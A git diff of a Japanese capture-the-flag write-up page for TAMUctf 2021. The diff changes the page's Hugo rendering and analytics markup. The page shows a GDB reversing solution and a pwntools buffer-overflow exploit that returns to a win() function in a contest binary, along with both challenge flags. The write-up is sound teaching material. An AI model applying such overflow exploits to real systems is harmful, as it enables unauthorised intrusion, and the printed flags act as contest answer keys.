@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/tamuctf_2021/" />
@@ -35,24 +35,20 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="TAMUctf 2021 Writeup" />
 <meta property="og:description" content="URL: https://tamuctf.com/challenges 去年のTAMU CTF 2020 (Writeup) は Network Pentest のチャレンジがあったりしたんですが、今年はなかったですね。残念〜。 800 points取りました。順位は、94thだ" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/tamuctf_2021/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/tamuctf_2021/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-05-04T15:30:00+09:00" />
 <meta property="article:modified_time" content="2021-05-04T15:30:00+09:00" />
 <meta itemprop="name" content="TAMUctf 2021 Writeup">
-<meta itemprop="description" content="URL: https://tamuctf.com/challenges 去年のTAMU CTF 2020 (Writeup) は Network Pentest のチャレンジがあったりしたんですが、今年はなかったですね。残念〜。 800 points取りました。順位は、94thだ">
-<meta itemprop="datePublished" content="2021-05-04T15:30:00&#43;09:00" />
-<meta itemprop="dateModified" content="2021-05-04T15:30:00&#43;09:00" />
+<meta itemprop="description" content="URL: https://tamuctf.com/challenges 去年のTAMU CTF 2020 (Writeup) は Network Pentest のチャレンジがあったりしたんですが、今年はなかったですね。残念〜。 800 points取りました。順位は、94thだ"><meta itemprop="datePublished" content="2021-05-04T15:30:00+09:00" />
+<meta itemprop="dateModified" content="2021-05-04T15:30:00+09:00" />
 <meta itemprop="wordCount" content="934">
-
-
-
 <meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="TAMUctf 2021 Writeup"/>
 <meta name="twitter:description" content="URL: https://tamuctf.com/challenges 去年のTAMU CTF 2020 (Writeup) は Network Pentest のチャレンジがあったりしたんですが、今年はなかったですね。残念〜。 800 points取りました。順位は、94thだ"/>
@@ -173,12 +169,12 @@
 <p>URL: <a href="https://tamuctf.com/challenges">https://tamuctf.com/challenges</a>
 <br /><br />
 去年のTAMU CTF 2020 (<a href="https://captureamerica.github.io/writeups/post/tamuctf_2020/">Writeup</a>) は Network Pentest のチャレンジがあったりしたんですが、今年はなかったですね。残念〜。</p>
-<p><br /></p>
+<br />
 <p>800 points取りました。順位は、94thだったみたいです。（CTF TIME情報）</p>
-<p><br /></p>
+<br />
 <p>以下が解いたチャレンジです。</p>
 <img src="https://captureamerica.github.io/writeups/img/tamuctf_2021_Solved.png" alt="tamuctf_2021_Solved.png">
-<p><br /></p>
+<br />
 <p><br /><br /></p>
 <h2 id="reversing-acrylic-100-points">[Reversing]: Acrylic (100 points)</h2>
 <hr>
@@ -192,14 +188,14 @@ Hint: Try using GDB</p>
 <ul>
 <li>acrylic (ELF 64bit)</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution">Solution</h3>
 <p>問題文にあるように Fake flag が沢山あるため、stringsコマンドは使えません。<br /> (いちおう正解フラグもstringsで出てくるので、ひたすらSubmitしたら、そのうち当たりますけど。。)</p>
-<p><br />
-GDBを使う前に、Ghidraでコードを見てみます。</p>
+<br />
+GDBを使う前に、Ghidraでコードを見てみます。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -221,32 +217,32 @@ GDBを使う前に、Ghidraでコードを見てみます。</p>
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;look at the code&#34;</span><span class="p">);</span>
-  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-
-
-<span class="kt">char</span> <span class="o">*</span> <span class="nf">get_flag</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="kt">int</span> <span class="n">local_10</span><span class="p">;</span>
-  <span class="n">uint</span> <span class="n">local_c</span><span class="p">;</span>
-  
-  <span class="n">local_10</span> <span class="o">=</span> <span class="mh">0x7b</span><span class="p">;</span>
-  <span class="n">local_c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-  <span class="k">while</span> <span class="p">(</span><span class="n">local_c</span> <span class="o">&lt;</span> <span class="mh">0x7e4</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">local_10</span> <span class="o">=</span> <span class="p">((</span><span class="n">local_10</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">local_10</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x7f</span><span class="p">;</span>
-    <span class="n">local_c</span> <span class="o">=</span> <span class="n">local_c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
-  <span class="p">}</span>
-  <span class="k">return</span> <span class="n">flags</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_10</span> <span class="o">*</span> <span class="mh">0x40</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;look at the code&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span> <span class="nf">get_flag</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">uint</span> <span class="n">local_c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="mh">0x7b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="n">local_c</span> <span class="o">&lt;</span> <span class="mh">0x7e4</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">local_10</span> <span class="o">=</span> <span class="p">((</span><span class="n">local_10</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">local_10</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x7f</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">local_c</span> <span class="o">=</span> <span class="n">local_c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">flags</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_10</span> <span class="o">*</span> <span class="mh">0x40</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br />
-main()は文字列を表示して終了するだけの関数です。</p>
+</div><br />
+main()は文字列を表示して終了するだけの関数です。
 <p>get_flag()は関数名から予想するに、flagを取得するための関数です。</p>
-<p><br /></p>
+<br />
 <p>GDBを使ってやることは、</p>
 <ol>
 <li>main() で一旦break</li>
@@ -254,7 +250,7 @@ main()は文字列を表示して終了するだけの関数です。</p>
 <li>returnする直前にbreakをかけて、戻り値を確認</li>
 </ol>
 <p>となります。get_flag() 自体は flag を printf しないので、GDB内で値を確認する必要があります。</p>
-<p><br /></p>
+<br />
 <pre>
 gef➤ b main
 gef➤ b get_flag
@@ -265,7 +261,7 @@ gef➤ c
 
 $rax   : 0x0000555555756620  →  "gigem{counteradvise_orbitoides}"
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>gigem{counteradvise_orbitoides}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -281,12 +277,12 @@ openssl s_client -connect tamuctf.com:443 -servername handshake -quiet</p>
 <ul>
 <li>handshake (ELF 32bit)</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-1">Solution</h3>
 <p>まず、問題文に出てくる openssl コマンドについてですが、News (announcement) で以下が出ていました。</p>
 <img src="https://captureamerica.github.io/writeups/img/tamuctf_2021_openssl.png" alt="tamuctf_2021_openssl.png">
-<p><br />
-socatでトンネルを確立したら、あとはローカルでやってるのと同じ感覚でできるようです。</p>
+<br />
+socatでトンネルを確立したら、あとはローカルでやってるのと同じ感覚でできるようです。
 <p><br /><br /></p>
 <p>まずは、checksecを実行してみます。PIEは無効です。</p>
 <pre>
@@ -297,11 +293,11 @@ $ checksec handshake
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
 </pre>
-<p><br />
-vuln() 関数でBOFができます。他に、win()関数があるので、BOFを起こしてwin()に飛ぶだけです。</p>
+<br />
+vuln() 関数でBOFができます。他に、win()関数があるので、BOFを起こしてwin()に飛ぶだけです。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -314,21 +310,21 @@ vuln() 関数でBOFができます。他に、win()関数があるので、BOF�
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-
-<span class="p">{</span>
-  <span class="kt">char</span> <span class="n">local_2c</span> <span class="p">[</span><span class="mi">36</span><span class="p">];</span>
-  
-  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Whats the secret handshake? &#34;</span><span class="p">);</span>
-  <span class="n">fflush</span><span class="p">((</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
-  <span class="n">gets</span><span class="p">(</span><span class="n">local_2c</span><span class="p">);</span>
-  <span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
-  <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_2c</span> <span class="p">[</span><span class="mi">36</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Whats the secret handshake? &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">((</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">local_2c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br />
-GDBでwin()のアドレスを確認。</p>
+</div><br />
+GDBでwin()のアドレスを確認。
 <pre>
 gef➤  b main
 Breakpoint 1 at 0x8049321
@@ -339,11 +335,11 @@ gef➤  r
 gef➤  p win
 $1 = {&lt;text variable, no debug info&gt;} 0x80491c2 <win>
 </pre>
-<p><br /></p>
+<br />
 <p>書いたコード。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -357,21 +353,21 @@ $1 = {&lt;text variable, no debug info&gt;} 0x80491c2 <win>
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">36</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">8</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080491c2</span><span class="p">)</span>  <span class="c1"># win()</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Whats the secret handshake? &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">36</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080491c2</span><span class="p">)</span>  <span class="c1"># win()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Whats the secret handshake? &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
+</div><br />
 <p>結果：</p>
 <pre>
 $ socat -d TCP-LISTEN:4444,reuseaddr,fork EXEC:'openssl s_client -connect tamuctf.com\:443 -servername handshake -quiet'
@@ -437,7 +433,7 @@ Correct! gigem{r37urn_c0n7r0l1337}
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -472,20 +468,21 @@ Correct! gigem{r37urn_c0n7r0l1337}
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
